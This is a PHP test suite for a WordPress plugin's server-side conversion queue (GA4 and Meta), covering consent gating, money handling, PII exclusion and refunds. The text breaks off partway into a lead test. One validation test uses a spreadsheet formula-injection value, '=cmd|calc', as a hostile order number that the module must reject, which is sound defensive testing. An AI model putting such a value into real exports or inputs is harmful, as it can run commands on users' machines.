<?php
/**
 * WP-08 tests: server-side conversions and the offline-conversion export.
 *
 * Runs the real module (queue, allow-list, GA4 and Meta handlers, offline export, admin tab) against the harness's
 * in-memory SQLite database with the real outbox and attribution CREATE TABLE statements, the real shared outbox
 * dispatcher, and the harness's fake HTTP transport, which FAILS THE TEST on any call a test did not declare. No test
 * contacts a real host. Core is stubbed (DoughBoss_Order::get from stubs-attribution.php, DoughBoss_Catering::get from
 * stubs-conversions.php). The consent snapshot is written straight into the attribution record with the module's public
 * write_subject(), exactly as WP-04 stores it, so this file never loads the consent module.
 *
 * @package DoughBoss_Growth
 */

DoughBoss_Growth::load_module( 'attribution' );
DoughBoss_Growth::load_module( 'conversions' );

/* ---------------------------------------------------------------------------------------------------------- */
/* Helpers                                                                                                     */
/* ---------------------------------------------------------------------------------------------------------- */

/** Secrets used by the tests: obviously fake. */
define( 'DBGR_CV_GA4_SECRET', 'TESTONLYGA4SECRETVALUE' );
define( 'DBGR_CV_META_TOKEN', 'TESTONLYMETATOKENVALUE' );

/** Decoded fixture. */
function dbgr_cv_fixture( $name ) {
	$data = json_decode( (string) file_get_contents( __DIR__ . '/fixtures/' . $name . '.json' ), true );
	if ( ! is_array( $data ) ) {
		throw new RuntimeException( 'fixture ' . $name . ' is not valid JSON' );
	}
	return $data;
}

/** Set (or clear) the secret environment variables. */
function dbgr_cv_env( array $values ) {
	foreach ( DoughBoss_Growth_Settings::SECRET_NAMES as $name ) {
		putenv( $name );
	}
	foreach ( $values as $name => $value ) {
		putenv( $name . '=' . $value );
	}
}

/** Recursively sort keys so two arrays compare regardless of key order. */
function dbgr_cv_sorted( $value ) {
	if ( ! is_array( $value ) ) {
		return $value;
	}
	$is_list = ( array_keys( $value ) === range( 0, count( $value ) - 1 ) );
	foreach ( $value as $key => $item ) {
		$value[ $key ] = dbgr_cv_sorted( $item );
	}
	if ( ! $is_list ) {
		ksort( $value );
	}
	return $value;
}

/**
 * Boot the module state: SQLite with the real outbox and attribution tables, settings with the feature on and both
 * destinations configured (override with $o), secrets in the environment. Does NOT call init().
 *
 * @param array $o features, settings, env, storage (bool), hashed (bool).
 */
function dbgr_cv_boot( array $o = array() ) {
	$GLOBALS['wpdb']->use_sqlite();
	foreach ( DoughBoss_Growth_Outbox::schema() as $sql ) {
		$GLOBALS['wpdb']->create_table_from_mysql( $sql );
	}
	foreach ( DoughBoss_Growth_Attribution::schema() as $sql ) {
		$GLOBALS['wpdb']->create_table_from_mysql( $sql );
	}
	if ( ! isset( $o['storage'] ) || false !== $o['storage'] ) {
		update_option( DoughBoss_Growth_Activator::DB_VERSION_OPTION, DOUGHBOSS_GROWTH_DB_VERSION );
	}
	$env = array_key_exists( 'env', $o ) ? $o['env'] : array(
		'DOUGHBOSS_GROWTH_GA4_API_SECRET'  => DBGR_CV_GA4_SECRET,
		'DOUGHBOSS_GROWTH_META_CAPI_TOKEN' => DBGR_CV_META_TOKEN,
	);
	dbgr_cv_env( $env );
	$features = array_merge(
		array(
			'attribution'        => true,
			'server_conversions' => true,
		),
		isset( $o['features'] ) ? $o['features'] : array()
	);
	update_option(
		DoughBoss_Growth_Settings::OPTION,
		array_merge(
			array(
				'features'                => $features,
				'ga4_measurement_id'      => 'G-TEST1234',
				'meta_pixel_id'           => '123456789012345',
				'send_hashed_identifiers' => empty( $o['hashed'] ) ? 0 : 1,
			),
			isset( $o['settings'] ) ? $o['settings'] : array()
		)
	);
	DoughBoss_Growth_Outbox::init(); // As the real bootstrap does: the 5-minute schedule and the dispatcher hook.
	DoughBoss_Order::$rows       = array();
	DoughBoss_Order::$throw      = false;
	DoughBoss_Catering::$rows    = array();
	DoughBoss_Catering::$throw   = false;
	$GLOBALS['dbgr_cv_log']      = array();
	add_action(
		'doughboss_growth_log',
		function ( $line ) {
			$GLOBALS['dbgr_cv_log'][] = $line;
		},
		10,
		1
	);
}

/** Boot, then init the module. */
function dbgr_cv_start( array $o = array() ) {
	dbgr_cv_boot( $o );
	DoughBoss_Growth_Conversions::init();
}

/** A paid order in the core stub. */
function dbgr_cv_order( $id, array $over = array() ) {
	DoughBoss_Order::$rows[ $id ] = (object) array_merge(
		array(
			'id'             => $id,
			'order_number'   => 'DB-261002-ABC123',
			'total'          => '35.99',
			'currency'       => 'AUD',
			'payment_status' => 'paid',
			'customer_name'  => 'Jane Citizen',
			'customer_email' => 'jane.citizen@example.net',
			'customer_phone' => '0412 345 678',
			'address'        => '12 Smith Street Revesby',
			'notes'          => 'leave at back door gate code 4821',
		),
		$over
	);
}

/** A catering enquiry in the core stub. */
function dbgr_cv_enquiry( $id, array $over = array() ) {
	DoughBoss_Catering::$rows[ $id ] = array_merge(
		array(
			'id'              => $id,
			'enquiry_number'  => 'DB-Q-7K2M4X',
			'status'          => 'new',
			'customer_name'   => 'Jane Citizen',
			'customer_email'  => 'jane.citizen@example.net',
			'customer_phone'  => '0412 345 678',
			'address'         => '12 Smith Street Revesby',
			'notes'           => 'leave at back door gate code 4821',
			'quote_total'     => '1250.00',
			'deposit_amount'  => '625.00',
			'balance_amount'  => '625.00',
			'currency'        => 'AUD',
			'quoted_at'       => null,
			'balance_paid_at' => null,
		),
		$over
	);
}

/** The attribution the visitor arrived with. */
function dbgr_cv_attr( array $over = array() ) {
	return array_merge(
		array(
			'utmSource'   => 'test',
			'gclid'       => 'Cj0KCQjwTESTCLICKID1234',
			'fbclid'      => 'AbCdEfGhIj1234567890',
			'firstSeenAt' => '2026-10-01T00:00:00.000Z',
			'landingPath' => '/catering/',
		),
		$over
	);
}

/** Store the attribution and consent record for a subject, the way WP-04 does. */
function dbgr_cv_subject( $type, $id, $m, $a, $attr = null ) {
	return DoughBoss_Growth_Attribution::write_subject(
		$type,
		$id,
		null === $attr ? dbgr_cv_attr() : $attr,
		array(
			'measurement' => (bool) $m,
			'advertising' => (bool) $a,
			'chosen'      => true,
			'version'     => '1',
		)
	);
}

/** Outbox rows (decoded payload under "payload"), optionally for one channel. */
function dbgr_cv_rows( $channel = null ) {
	$out = array();
	foreach ( $GLOBALS['wpdb']->sqlite_raw( 'SELECT * FROM wp_doughboss_growth_outbox ORDER BY id' ) as $row ) {
		if ( null !== $channel && $row['channel'] !== $channel ) {
			continue;
		}
		$row['payload'] = json_decode( $row['payload_json'], true );
		$out[]          = $row;
	}
	return $out;
}

/** Channels that have a queued row. */
function dbgr_cv_channels() {
	$channels = array();
	foreach ( dbgr_cv_rows() as $row ) {
		$channels[] = $row['channel'];
	}
	return $channels;
}

/** Assert a JSON string leaks none of the customer's details and carries no personal-data key. */
function dbgr_cv_assert_no_pii( $json, $label, $allow_event_name_key = false ) {
	foreach ( array( 'jane.citizen', 'example.net', 'Jane', 'Citizen', '0412', '345 678', 'Smith Street', 'Revesby', 'gate code', 'back door' ) as $needle ) {
		assert_not_contains( $needle, $json, $label . ': no "' . $needle . '"' );
	}
	$keys = $allow_event_name_key ? 'email|phone|mobile|first_name|last_name|full_name|customer_name|address|notes|ip|ip_address|user_agent|client_ip_address|client_user_agent' : 'email|phone|mobile|name|first_name|last_name|full_name|customer_name|address|notes|ip|ip_address|user_agent|client_ip_address|client_user_agent';
	assert_same( 0, preg_match( '/"(' . $keys . ')"\s*:/i', $json ), $label . ': no personal-data key' );
}

/** The expected provider body from the fixture, placeholders filled. */
function dbgr_cv_expected_body( $name ) {
	$text = (string) file_get_contents( __DIR__ . '/fixtures/conversions-bodies.json' );
	$all  = json_decode( str_replace( array( '@home@', '@token@' ), array( home_url( '/' ), DBGR_CV_META_TOKEN ), $text ), true );
	return $all[ $name ];
}

/** Run the outbox once and return its summary. */
function dbgr_cv_dispatch() {
	return DoughBoss_Growth_Outbox::dispatch();
}

/** The recorded request whose URL starts with a prefix. */
function dbgr_cv_call( $prefix ) {
	foreach ( dbgr_test_http_calls() as $call ) {
		if ( 0 === strpos( $call['url'], $prefix ) ) {
			return $call;
		}
	}
	return null;
}

/** A good Meta or GA4 payload for the validator tests. */
function dbgr_cv_good_payload( $event = 'purchase' ) {
	$base = array(
		'v'          => 1,
		'event'      => $event,
		'event_id'   => 'order:DB-261002-ABC123',
		'event_time' => 1790899200,
		'currency'   => 'AUD',
		'consent'    => array(
			'm' => 1,
			'a' => 1,
			'v' => '1',
		),
	);
	if ( 'purchase' === $event || 'refund' === $event ) {
		$base['event_id']       = ( 'refund' === $event ? 'refund:' : 'order:' ) . 'DB-261002-ABC123';
		$base['transaction_id'] = 'DB-261002-ABC123';
		$base['value_cents']    = 3599;
	} else {
		$base['event_id'] = 'lead:DB-Q-7K2M4X';
		$base['form']     = 'catering_enquiry';
	}
	return $base;
}

/* ---------------------------------------------------------------------------------------------------------- */
/* Off by default, fail closed                                                                                 */
/* ---------------------------------------------------------------------------------------------------------- */

db_test(
	'off by default: with the flag off init() registers no hook and no channel, and every trigger queues nothing',
	function () {
		dbgr_cv_boot( array( 'features' => array( 'server_conversions' => false ) ) );
		$names_before = dbgr_test_hook_names();
		DoughBoss_Growth_Conversions::init();
		assert_same( $names_before, dbgr_test_hook_names(), 'no hook was added' );
		assert_same( array(), DoughBoss_Growth_Outbox::channels(), 'no outbox channel was registered' );
		dbgr_cv_order( 17 );
		dbgr_cv_subject( 'order', 17, 1, 1 );
		do_action( 'doughboss_order_created', 17, array() );
		assert_same( array( 'skipped' => 'inactive' ), DoughBoss_Growth_Conversions::process_order( 17, 'purchase', '' ), 'a direct call is inert as well' );
		assert_same( array(), dbgr_cv_rows(), 'nothing queued' );
		assert_same( array(), dbgr_test_http_calls(), 'no HTTP' );
	}
);

db_test(
	'off by default: a fresh install (no settings at all) is inert, and a corrupted settings option is too',
	function () {
		dbgr_cv_boot();
		delete_option( DoughBoss_Growth_Settings::OPTION );
		DoughBoss_Growth_Conversions::init();
		assert_same( array(), DoughBoss_Growth_Outbox::channels(), 'defaults: no channel' );
		update_option( DoughBoss_Growth_Settings::OPTION, 'garbage' );
		DoughBoss_Growth_Conversions::init();
		assert_same( array(), DoughBoss_Growth_Outbox::channels(), 'corrupt option: no channel' );
		assert_same( 0, dbgr_test_hook_count( 'doughboss_order_created' ), 'no order hook' );
	}
);

db_test(
	'fail closed: the doughboss_growth_feature_enabled filter (which can only switch things off) stops the module',
	function () {
		dbgr_cv_boot();
		add_filter( 'doughboss_growth_feature_enabled', '__return_false' );
		DoughBoss_Growth_Conversions::init();
		assert_same( array(), DoughBoss_Growth_Outbox::channels(), 'no channel' );
		assert_same( 0, dbgr_test_hook_count( 'doughboss_catering_enquiry_created' ), 'no lead hook' );
	}
);

db_test(
	'fail closed: without the attribution flag the feature cannot be on (WP-01 dependency rule), so nothing is queued',
	function () {
		dbgr_cv_boot( array( 'features' => array( 'attribution' => false ) ) );
		DoughBoss_Growth_Conversions::init();
		assert_false( DoughBoss_Growth_Settings::enabled( 'server_conversions' ), 'the flag is not effectively on' );
		assert_same( 0, dbgr_test_hook_count( 'doughboss_order_created' ), 'no hook' );
	}
);

db_test(
	'fail closed: storage not installed means inert (hooks may be registered but nothing is queued and nothing throws)',
	function () {
		dbgr_cv_start( array( 'storage' => false ) );
		dbgr_cv_order( 17 );
		dbgr_cv_subject( 'order', 17, 1, 1 );
		do_action( 'doughboss_order_created', 17, array() );
		assert_same( array( 'skipped' => 'inactive' ), DoughBoss_Growth_Conversions::process_order( 17, 'purchase', '' ), 'inactive without storage' );
		assert_same( array(), dbgr_cv_rows(), 'nothing queued' );
	}
);

db_test(
	'init(): registers exactly the three core hooks after WP-04 (priority 30), the admin tab and the export action; channels only for configured destinations',
	function () {
		dbgr_cv_start();
		assert_same( array( 'ga4', 'meta' ), DoughBoss_Growth_Outbox::channels(), 'both channels registered' );
		foreach ( array( 'doughboss_order_created', 'doughboss_order_payment_status_changed', 'doughboss_catering_enquiry_created' ) as $hook ) {
			assert_same( 1, dbgr_test_hook_count( $hook ), $hook . ' has one callback' );
			assert_same( 30, array_keys( $GLOBALS['dbgr_hooks'][ $hook ] )[0], $hook . ' runs at priority 30, after the attribution record is written at 20' );
		}
		assert_same( 1, dbgr_test_hook_count( 'doughboss_growth_admin_tabs' ), 'admin tab hooked' );
		assert_same( 1, dbgr_test_hook_count( 'admin_post_doughboss_growth_export_offline_conversions' ), 'export action hooked' );

		DoughBoss_Growth_Outbox::reset_handlers();
		dbgr_cv_start( array( 'env' => array( 'DOUGHBOSS_GROWTH_GA4_API_SECRET' => DBGR_CV_GA4_SECRET ) ) );
		assert_same( array( 'ga4' ), DoughBoss_Growth_Outbox::channels(), 'Meta has no token, so only GA4 is registered' );
	}
);

/* ---------------------------------------------------------------------------------------------------------- */
/* Money                                                                                                       */
/* ---------------------------------------------------------------------------------------------------------- */

db_test(
	'money: to_cents() gives exact integer cents for every fixture case (strings, floats, ints) and refuses bad input',
	function () {
		$fixture = dbgr_cv_fixture( 'conversions-money' );
		assert_true( count( $fixture['cases'] ) >= 30, 'the fixture has at least 30 cases' );
		foreach ( $fixture['cases'] as $case ) {
			assert_same( $case['cents'], DoughBoss_Growth_Conversions::to_cents( $case['input'] ), 'to_cents(' . var_export( $case['input'], true ) . ')' );
		}
		assert_same( null, DoughBoss_Growth_Conversions::to_cents( NAN ), 'NAN refused' );
		assert_same( null, DoughBoss_Growth_Conversions::to_cents( INF ), 'INF refused' );
		assert_same( null, DoughBoss_Growth_Conversions::to_cents( new stdClass() ), 'object refused' );
		// The classic float trap: 19.99 and 0.1 + 0.2 must not drift.
		assert_same( 1999, DoughBoss_Growth_Conversions::to_cents( 19.99 ), '19.99 is 1999 cents' );
		assert_same( 30, DoughBoss_Growth_Conversions::to_cents( 0.1 + 0.2 ), '0.1 + 0.2 is 30 cents' );
	}
);

db_test(
	'money: cents become a decimal AUD number once, and the JSON writes it exactly whatever serialize_precision the host uses',
	function () {
		$fixture = dbgr_cv_fixture( 'conversions-money' );
		foreach ( $fixture['values'] as $case ) {
			assert_same( $case['value'], DoughBoss_Growth_Conversions::cents_to_value( $case['cents'] ), 'value for ' . $case['cents'] . ' cents' );
		}
		$previous = ini_get( 'serialize_precision' );
		ini_set( 'serialize_precision', '17' );
		assert_contains( '35.990000000000002', json_encode( array( 'v' => 35.99 ) ), 'control: with precision 17 plain json_encode writes the long form' );
		$json = DoughBoss_Growth_Conversions::encode_json( array( 'value' => DoughBoss_Growth_Conversions::cents_to_value( 3599 ) ) );
		assert_same( '{"value":35.99}', $json, 'encode_json writes 35.99 even then' );
		assert_same( '17', ini_get( 'serialize_precision' ), 'the host setting is restored' );
		ini_set( 'serialize_precision', (string) $previous );
	}
);

/* ---------------------------------------------------------------------------------------------------------- */
/* Purchase                                                                                                    */
/* ---------------------------------------------------------------------------------------------------------- */

db_test(
	'purchase: a paid order queues one row per consented channel with the exact payload, event_id order:{number}, cents from the decimal total, and a scheduled dispatcher',
	function () {
		dbgr_cv_start();
		dbgr_cv_order( 17 );
		dbgr_cv_subject( 'order', 17, 1, 1 );
		do_action( 'doughboss_order_created', 17, array() );

		$rows = dbgr_cv_rows();
		assert_same( array( 'ga4', 'meta' ), dbgr_cv_channels(), 'one row per channel' );
		$expected = array(
			'v'              => 1,
			'event'          => 'purchase',
			'event_id'       => 'order:DB-261002-ABC123',
			'event_time'     => DBGR_TEST_EPOCH,
			'currency'       => 'AUD',
			'transaction_id' => 'DB-261002-ABC123',
			'value_cents'    => 3599,
			'consent'        => array(
				'm' => 1,
				'a' => 1,
				'v' => '1',
			),
		);
		assert_same( dbgr_cv_sorted( $expected ), dbgr_cv_sorted( $rows[0]['payload'] ), 'GA4 payload exact' );
		assert_same( 'order:DB-261002-ABC123', $rows[0]['event_id'], 'outbox event_id' );
		assert_same( 'purchase', $rows[0]['event_name'], 'outbox event_name' );
		assert_same( 'order', $rows[0]['subject_type'], 'subject type' );
		assert_same( '17', (string) $rows[0]['subject_id'], 'subject id' );
		assert_same( 'pending', $rows[0]['status'], 'pending' );
		$meta                = $expected;
		$meta['fbc']         = 'fb.1.1790812800000.AbCdEfGhIj1234567890';
		assert_same( dbgr_cv_sorted( $meta ), dbgr_cv_sorted( $rows[1]['payload'] ), 'Meta payload exact (fbc from the click id and the first-seen time)' );
		assert_true( false !== wp_next_scheduled( DoughBoss_Growth_Outbox::CRON_HOOK ), 'the dispatcher is scheduled' );
		foreach ( $rows as $row ) {
			dbgr_cv_assert_no_pii( $row['payload_json'], 'row ' . $row['channel'] );
		}
		assert_same( array(), dbgr_test_http_calls(), 'queueing makes no HTTP call' );
	}
);

db_test(
	'purchase: pay-at-shop (unpaid) orders never produce a purchase; the order becoming paid later does; a refund of an unpaid order is nothing',
	function () {
		dbgr_cv_start();
		dbgr_cv_order( 18, array( 'order_number' => 'DB-261002-SHOP01', 'payment_status' => 'unpaid' ) );
		dbgr_cv_subject( 'order', 18, 1, 1 );
		do_action( 'doughboss_order_created', 18, array( 'payment_status' => 'paid' ) ); // The hook payload lies: the stored row is the authority.
		assert_same( array(), dbgr_cv_rows(), 'an unpaid order is not a purchase, whatever the hook data says' );
		assert_same( array( 'skipped' => 'not_paid' ), DoughBoss_Growth_Conversions::process_order( 18, 'purchase', '' ), 'reason: not paid' );

		do_action( 'doughboss_order_payment_status_changed', 18, 'paid', 'refunded' );
		assert_same( array(), dbgr_cv_rows(), 'a refund of an order the row says is still unpaid is nothing' );

		DoughBoss_Order::$rows[18]->payment_status = 'paid';
		do_action( 'doughboss_order_payment_status_changed', 18, 'unpaid', 'paid' );
		assert_same( array( 'ga4', 'meta' ), dbgr_cv_channels(), 'once paid, the purchase is queued' );
		assert_same( 'order:DB-261002-SHOP01', dbgr_cv_rows()[0]['event_id'], 'with its own event id' );
	}
);

db_test(
	'purchase: a replayed doughboss_order_created (and created followed by status paid) never double-enqueues (UNIQUE channel + event_id)',
	function () {
		dbgr_cv_start();
		dbgr_cv_order( 17 );
		dbgr_cv_subject( 'order', 17, 1, 1 );
		do_action( 'doughboss_order_created', 17, array() );
		do_action( 'doughboss_order_created', 17, array() );
		do_action( 'doughboss_order_payment_status_changed', 17, 'unpaid', 'paid' );
		assert_count( 2, dbgr_cv_rows(), 'still one row per channel' );
		assert_same( array( 'ga4' => 'duplicate', 'meta' => 'duplicate' ), DoughBoss_Growth_Conversions::process_order( 17, 'purchase', '' ), 'the third attempt reports duplicate on both channels' );
		assert_same( 1, (int) $GLOBALS['wpdb']->sqlite_raw( "SELECT COUNT(*) AS n FROM wp_doughboss_growth_outbox WHERE channel = 'ga4'" )[0]['n'], 'one GA4 row' );
	}
);

db_test(
	'purchase: an order with a bad number, a zero or negative or malformed total, or a non-AUD currency queues nothing',
	function () {
		dbgr_cv_start();
		$cases = array(
			'no number'        => array( 'order_number' => '' ),
			'hostile number'   => array( 'order_number' => '=cmd|calc' ),
			'number with space' => array( 'order_number' => 'DB 1' ),
			'zero total'       => array( 'total' => '0.00' ),
			'negative total'   => array( 'total' => '-5.00' ),
			'text total'       => array( 'total' => 'free' ),
			'USD'              => array( 'currency' => 'USD' ),
			'no currency'      => array( 'currency' => '' ),
			'over the cap'     => array( 'total' => '1000000.00' ),
		);
		$id = 100;
		foreach ( $cases as $label => $over ) {
			$id++;
			dbgr_cv_order( $id, $over );
			dbgr_cv_subject( 'order', $id, 1, 1 );
			$result = DoughBoss_Growth_Conversions::process_order( $id, 'purchase', '' );
			assert_true( isset( $result['skipped'] ), $label . ': skipped' );
		}
		assert_same( array(), dbgr_cv_rows(), 'nothing queued for any of them' );
		assert_same( array( 'skipped' => 'no_order' ), DoughBoss_Growth_Conversions::process_order( 9999, 'purchase', '' ), 'an unknown order is skipped' );
		assert_same( array( 'skipped' => 'bad_input' ), DoughBoss_Growth_Conversions::process_order( 0, 'purchase', '' ), 'bad id' );
		assert_same( array( 'skipped' => 'bad_input' ), DoughBoss_Growth_Conversions::process_order( 17, 'lead', '' ), 'bad event' );
	}
);

/* ---------------------------------------------------------------------------------------------------------- */
/* Consent                                                                                                     */
/* ---------------------------------------------------------------------------------------------------------- */

db_test(
	'consent: measurement 0 sends nothing to GA4; advertising 0 sends nothing to Meta; neither sends nothing; no stored record sends nothing',
	function () {
		dbgr_cv_start();
		$matrix = array(
			array( 1, 1, array( 'ga4', 'meta' ) ),
			array( 1, 0, array( 'ga4' ) ),
			array( 0, 1, array( 'meta' ) ),
			array( 0, 0, array() ),
		);
		$id = 200;
		foreach ( $matrix as $case ) {
			$id++;
			dbgr_cv_order( $id, array( 'order_number' => 'DB-261002-C' . $id ) );
			dbgr_cv_subject( 'order', $id, $case[0], $case[1] );
			do_action( 'doughboss_order_created', $id, array() );
			$channels = array();
			foreach ( dbgr_cv_rows() as $row ) {
				if ( $row['event_id'] === 'order:DB-261002-C' . $id ) {
					$channels[] = $row['channel'];
				}
			}
			assert_same( $case[2], $channels, 'm:' . $case[0] . ' a:' . $case[1] );
		}
		dbgr_cv_order( 300, array( 'order_number' => 'DB-261002-NOREC' ) );
		do_action( 'doughboss_order_created', 300, array() );
		assert_same( array( 'ga4' => 'no_consent', 'meta' => 'no_consent' ), DoughBoss_Growth_Conversions::process_order( 300, 'purchase', '' ), 'no stored record is no consent' );
		foreach ( dbgr_cv_rows() as $row ) {
			assert_true( 'order:DB-261002-NOREC' !== $row['event_id'], 'nothing for the order with no record' );
		}
	}
);

db_test(
	'consent: the payload carries the consent flags; a malformed stored consent record reads as no consent',
	function () {
		dbgr_cv_start();
		dbgr_cv_order( 17 );
		dbgr_cv_subject( 'order', 17, 1, 0 );
		do_action( 'doughboss_order_created', 17, array() );
		assert_same( array( 'm' => 1, 'a' => 0, 'v' => '1' ), dbgr_cv_rows( 'ga4' )[0]['payload']['consent'], 'flags and wording version recorded' );

		dbgr_cv_order( 18, array( 'order_number' => 'DB-261002-BAD001' ) );
		$GLOBALS['wpdb']->sqlite_raw( "INSERT INTO wp_doughboss_growth_attribution (subject_type, subject_id, attribution_json, consent_json, captured_at) VALUES ('order', '18', '{}', '{not json', '2026-10-01 00:00:00')" );
		assert_same( array( 'ga4' => 'no_consent', 'meta' => 'no_consent' ), DoughBoss_Growth_Conversions::process_order( 18, 'purchase', '' ), 'garbage consent JSON is closed' );
		$GLOBALS['wpdb']->sqlite_raw( "INSERT INTO wp_doughboss_growth_attribution (subject_type, subject_id, attribution_json, consent_json, captured_at) VALUES ('order', '19', '{}', '{\"measurement\":\"yes\",\"advertising\":1}', '2026-10-01 00:00:00')" );
		dbgr_cv_order( 19, array( 'order_number' => 'DB-261002-BAD002' ) );
		assert_same( array( 'ga4' => 'no_consent', 'meta' => 'no_consent' ), DoughBoss_Growth_Conversions::process_order( 19, 'purchase', '' ), 'a truthy non-boolean is not consent' );
	}
);

/* ---------------------------------------------------------------------------------------------------------- */
/* Personal data                                                                                               */
/* ---------------------------------------------------------------------------------------------------------- */

db_test(
	'privacy: with send_hashed_identifiers 0 no queued payload (purchase, refund, lead) contains the name, email, phone, address or notes, hashed or plain',
	function () {
		dbgr_cv_start();
		dbgr_cv_order( 17 );
		dbgr_cv_subject( 'order', 17, 1, 1 );
		do_action( 'doughboss_order_created', 17, array() );
		DoughBoss_Order::$rows[17]->payment_status = 'refunded';
		do_action( 'doughboss_order_payment_status_changed', 17, 'paid', 'refunded' );
		dbgr_cv_enquiry( 5 );
		dbgr_cv_subject( 'enquiry', 5, 1, 1 );
		do_action( 'doughboss_catering_enquiry_created', 5, DoughBoss_Catering::$rows[5] );

		$rows = dbgr_cv_rows();
		assert_true( count( $rows ) >= 5, 'purchase (2), refund (1) and lead (2) were queued (' . count( $rows ) . ')' );
		foreach ( $rows as $row ) {
			dbgr_cv_assert_no_pii( $row['payload_json'], $row['channel'] . ' ' . $row['event_name'] );
			assert_not_contains( '1775ffd43cbfa30fa09b5ae986e099381e3f39cfc1ba201ccbb0ffa291427a43', $row['payload_json'], $row['event_name'] . ': no email hash' );
			assert_not_contains( '222e24d90b23ba2af558a2891bfa399f19a7eb9f33df34a7d6809b97c5a97246', $row['payload_json'], $row['event_name'] . ': no phone hash' );
			assert_false( isset( $row['payload']['em'] ) || isset( $row['payload']['ph'] ), $row['event_name'] . ': no em or ph key' );
		}
		// Negative control: the PII assertion itself catches a leak.
		dbgr_test_expect_failure(
			function () {
				dbgr_cv_assert_no_pii( '{"event":"purchase","email":"jane.citizen@example.net"}', 'planted leak' );
			},
			'the privacy assertion detects a planted email'
		);
	}
);

db_test(
	'privacy: with send_hashed_identifiers 1 and advertising consent Meta (only) gets the SHA-256 of the normalised email and Australian phone; GA4 never does; the plain values are still absent',
	function () {
		dbgr_cv_start( array( 'hashed' => true ) );
		dbgr_cv_order( 17, array( 'customer_email' => '  Jane.Citizen@Example.NET ' ) );
		dbgr_cv_subject( 'order', 17, 1, 1 );
		do_action( 'doughboss_order_created', 17, array() );
		$ga4  = dbgr_cv_rows( 'ga4' )[0];
		$meta = dbgr_cv_rows( 'meta' )[0];
		assert_false( isset( $ga4['payload']['em'] ) || isset( $ga4['payload']['ph'] ) || isset( $ga4['payload']['fbc'] ), 'GA4 carries no match keys' );
		assert_same( '1775ffd43cbfa30fa09b5ae986e099381e3f39cfc1ba201ccbb0ffa291427a43', $meta['payload']['em'], 'Meta em is sha256 of the lower-cased trimmed email (checked against sha256sum)' );
		assert_same( '222e24d90b23ba2af558a2891bfa399f19a7eb9f33df34a7d6809b97c5a97246', $meta['payload']['ph'], 'Meta ph is sha256 of 61412345678 (checked against sha256sum)' );
		dbgr_cv_assert_no_pii( $meta['payload_json'], 'Meta row with hashes' );
		dbgr_cv_assert_no_pii( $ga4['payload_json'], 'GA4 row' );
	}
);

db_test(
	'privacy: hashing needs advertising consent too (hashes on, advertising off: GA4 only, nothing hashed anywhere); a phone that is not Australian is dropped, never guessed',
	function () {
		dbgr_cv_start( array( 'hashed' => true ) );
		dbgr_cv_order( 17 );
		dbgr_cv_subject( 'order', 17, 1, 0 );
		do_action( 'doughboss_order_created', 17, array() );
		assert_same( array( 'ga4' ), dbgr_cv_channels(), 'Meta sends nothing without advertising consent' );
		assert_not_contains( '1775ffd4', dbgr_cv_rows( 'ga4' )[0]['payload_json'], 'no hash in the GA4 row' );

		assert_same( '', DoughBoss_Growth_Meta::hash_phone( '+1 202 555 0100' ), 'a US number is not guessed' );
		assert_same( '', DoughBoss_Growth_Meta::hash_phone( '0412' ), 'a short number is dropped' );
		assert_same( '', DoughBoss_Growth_Meta::hash_phone( '' ), 'empty' );
		assert_same( '', DoughBoss_Growth_Meta::hash_phone( array( '0412345678' ) ), 'not a string' );
		assert_same( DoughBoss_Growth_Meta::hash_phone( '0412 345 678' ), DoughBoss_Growth_Meta::hash_phone( '+61 412 345 678' ), '0412... and +61412... agree' );
		assert_same( '', DoughBoss_Growth_Meta::hash_email( 'not an email' ), 'a non-email is dropped' );
		assert_same( '', DoughBoss_Growth_Meta::hash_email( null ), 'null' );
	}
);

db_test(
	'meta: with no click id and hashing off there is nothing to match, so no Meta row is queued (GA4 still is); a click id alone is enough',
	function () {
		dbgr_cv_start();
		dbgr_cv_order( 17 );
		dbgr_cv_subject( 'order', 17, 1, 1, array( 'utmSource' => 'test', 'landingPath' => '/' ) );
		assert_same( array( 'ga4' => 'queued', 'meta' => 'no_match_keys' ), DoughBoss_Growth_Conversions::process_order( 17, 'purchase', '' ), 'no click id: no Meta event' );
		assert_same( array( 'ga4' ), dbgr_cv_channels(), 'only the GA4 row exists' );

		dbgr_cv_order( 18, array( 'order_number' => 'DB-261002-FB0002' ) );
		dbgr_cv_subject( 'order', 18, 0, 1, array( 'fbclid' => 'ZyXwVuTsRq0987654321' ) ); // Advertising only: no first-seen time, so the capture time is used.
		$result = DoughBoss_Growth_Conversions::process_order( 18, 'purchase', '' );
		assert_same( 'queued', $result['meta'], 'a click id alone is a match key' );
		$fbc = dbgr_cv_rows( 'meta' )[0]['payload']['fbc'];
		assert_same( 'fb.1.' . ( DBGR_TEST_EPOCH * 1000 ) . '.ZyXwVuTsRq0987654321', $fbc, 'fbc uses the capture time when there is no first-seen time' );
	}
);

/* ---------------------------------------------------------------------------------------------------------- */
/* Refund and lead                                                                                             */
/* ---------------------------------------------------------------------------------------------------------- */

db_test(
	'refund: a paid order that becomes refunded queues a GA4 refund (event_id refund:{number}) and nothing for Meta; replays do not double; consent still gates it',
	function () {
		dbgr_cv_start();
		dbgr_cv_order( 17, array( 'payment_status' => 'refunded' ) );
		dbgr_cv_subject( 'order', 17, 1, 1 );
		do_action( 'doughboss_order_payment_status_changed', 17, 'paid', 'refunded' );
		do_action( 'doughboss_order_payment_status_changed', 17, 'paid', 'refunded' );
		$rows = dbgr_cv_rows();
		assert_count( 1, $rows, 'one refund row' );
		assert_same( 'ga4', $rows[0]['channel'], 'GA4 only' );
		assert_same( 'refund', $rows[0]['event_name'], 'refund' );
		assert_same( 'refund:DB-261002-ABC123', $rows[0]['event_id'], 'event id' );
		assert_same( 3599, $rows[0]['payload']['value_cents'], 'value from the order total' );
		assert_same( array( 'ga4' => 'duplicate', 'meta' => 'unsupported' ), DoughBoss_Growth_Conversions::process_order( 17, 'refund', 'paid' ), 'Meta has no refund event' );

		dbgr_cv_order( 18, array( 'order_number' => 'DB-261002-REF002', 'payment_status' => 'refunded' ) );
		dbgr_cv_subject( 'order', 18, 0, 1 );
		do_action( 'doughboss_order_payment_status_changed', 18, 'paid', 'refunded' );
		assert_count( 1, dbgr_cv_rows(), 'no measurement consent, no refund');

		dbgr_cv_order( 19, array( 'order_number' => 'DB-261002-REF003', 'payment_status' => 'refunded' ) );
		dbgr_cv_subject( 'order', 19, 1, 1 );
		do_action( 'doughboss_order_payment_status_changed', 19, 'unpaid', 'refunded' );
		assert_count( 1, dbgr_cv_rows(), 'an order that was never paid is not refunded');
	}
);

db_test(
	'lead: a catering enquiry queues generate_lead (form catering_enquiry, no value, no transaction, event_id lead:{number}) per consented channel',
	function () {
